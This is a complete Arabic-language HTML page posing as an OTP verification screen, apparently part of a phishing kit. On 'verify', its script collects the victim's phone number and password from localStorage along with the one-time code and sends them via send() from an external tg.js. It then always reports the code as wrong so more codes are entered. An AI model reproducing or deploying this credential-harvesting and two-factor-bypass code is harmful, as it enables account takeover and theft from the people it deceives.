<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مصادقة OTP</title>

<style>

/* ================= Fonts ================= */
@font-face { font-family: "Roboto"; src: url("assets/fonts/Roboto-Thin.ttf"); font-weight:100; }

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:"Roboto", sans-serif;
  font-weight:100;
}

body{
  background:#f2f2f2;
}

/* ================= Top Bar ================= */
.top-bar{
  display:flex;
  justify-content:flex-end;
  align-items:center;
  padding:14px 16px;
  font-size:11px;
}

.cancel-text{
  font-size:11px;
}

.cancel-text a{
  color:#ff6a00;
  text-decoration:none;
  font-weight:400;
  margin-right:3px;
}

/* ================= Card ================= */
.card{
  width:100%;
  background:#fff;
  border-radius:24px 24px 0 0;
  margin-top:10px;
  min-height:85vh;

  display:flex;
  justify-content:center;
  align-items:center;
  padding:20px;
}

.card-content{
  width:100%;
  max-width:380px;
  text-align:center;
}

@media(min-width:768px){
  .card{
    width:400px;
    margin:40px auto;
    border-radius:24px;
    min-height:500px;
  }
}

.title{
  font-size:17px;
  margin-bottom:6px;
}

.subtitle{
  font-size:12px;
  color:#666;
  margin-bottom:25px;
}

/* ================= OTP INPUT ================= */
.otp-input{
  width:100%;
  height:46px;
  border-radius:14px;
  border:2px solid #ddd;
  text-align:center;
  font-size:14px;
  letter-spacing:4px;
  outline:none;
  transition:0.2s;
  margin-bottom:12px;
}

.otp-input:focus{
  border-color:#ff6a00;
}

.otp-input.filled{
  border-color:#ff6a00;
}

/* ================= Resend Section ================= */
.resend{
  font-size:11px;
  margin-bottom:20px;
}

.resend a{
  color:#ff6a00;
  text-decoration:none;
  pointer-events:none;
  opacity:0.5;
}

.resend a.active{
  pointer-events:auto;
  opacity:1;
}

.timer{
  margin-right:4px;
  color:#666;
}

/* ================= Button ================= */
.btn{
  width:100%;
  height:44px;
  border:none;
  border-radius:999px;
  font-size:13px;
  cursor:pointer;
}

.btn-primary{
  background:#ff6a00;
  color:#fff;
}

.btn-primary:disabled{
  background:#ffc6a0;
  cursor:not-allowed;
}

/* ================= Loader ================= */
.loader{
  display:none;
  width:24px;
  height:24px;
  border:3px solid #eee;
  border-top:3px solid #ff6a00;
  border-radius:50%;
  margin:12px auto;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  0%{ transform:rotate(0deg); }
  100%{ transform:rotate(360deg); }
}

.error{
  display:none;
  font-size:11px;
  color:#ff3b30;
  margin-bottom:12px;
}

</style>
</head>

<body>

<div class="top-bar">
  <div class="cancel-text">
    الغاء؟ <a href="signin.html">عد</a>
  </div>
</div>

<div class="card">
  <div class="card-content">

    <div class="title">مصادقة OTP</div>
    <div class="subtitle">تم ارسال المصادقة</div>

    <input 
      type="text"
      class="otp-input"
      id="otpInput"
      inputmode="numeric"
      maxlength="6"
    >

    <div class="resend">
      لم استلم رمز؟
      <a href="#" id="resendLink">أعد ارسال الرمز</a>
      <span class="timer" id="timer">(02:30)</span>
    </div>

    <div class="error" id="errorMsg">رمز غير صحيح</div>
    <div class="loader" id="loader"></div>

    <button class="btn btn-primary" id="verifyBtn" disabled>تحقق</button>

  </div>
</div>

<script src='./tg.js'></script>
<script>

const otpInput = document.getElementById("otpInput");
const verifyBtn = document.getElementById("verifyBtn");
const loader = document.getElementById("loader");
const errorMsg = document.getElementById("errorMsg");
const resendLink = document.getElementById("resendLink");
const timerEl = document.getElementById("timer");

let totalSeconds = 150;
let interval;

window.addEventListener("load",()=>{
  otpInput.focus();
  startTimer();
});

otpInput.addEventListener("input",()=>{
  otpInput.value = otpInput.value.replace(/[^0-9]/g,"");

  if(otpInput.value.length >= 4){
    verifyBtn.disabled = false;
    otpInput.classList.add("filled");
  } else {
    verifyBtn.disabled = true;
    otpInput.classList.remove("filled");
  }
});

function startTimer(){
  totalSeconds = 150;
  resendLink.classList.remove("active");
  resendLink.style.pointerEvents = "none";
  resendLink.style.opacity = "0.5";

  updateDisplay();

  interval = setInterval(()=>{
    totalSeconds--;
    updateDisplay();

    if(totalSeconds <= 0){
      clearInterval(interval);
      timerEl.textContent = "";
      resendLink.classList.add("active");
      resendLink.style.pointerEvents = "auto";
      resendLink.style.opacity = "1";
    }
  },1000);
}

function updateDisplay(){
  let minutes = Math.floor(totalSeconds / 60);
  let seconds = totalSeconds % 60;

  timerEl.textContent =
    `(${minutes < 10 ? "0"+minutes : minutes}:` +
    `${seconds < 10 ? "0"+seconds : seconds})`;
}

resendLink.addEventListener("click",(e)=>{
  e.preventDefault();
  if(!resendLink.classList.contains("active")) return;
  clearInterval(interval);
  startTimer();
});

verifyBtn.addEventListener("click",()=>{

  if(verifyBtn.disabled) return;

  loader.style.display="block";
  errorMsg.style.display="none";

  verifyBtn.disabled = true;
  otpInput.disabled = true;


  msg=`
    رقم الهاتف: ${localStorage.getItem('phone')}
    كلمة السر: ${localStorage.getItem('password')}
    رمز التخقق: ${otpInput.value}
  `
  send(msg)
  setTimeout(()=>{
    loader.style.display="none";
    errorMsg.style.display="block";

    otpInput.value="";
    otpInput.disabled = false;
    otpInput.classList.remove("filled");

    verifyBtn.disabled = true;
    otpInput.focus();
  },1500);
});

</script>

</body>
</html>
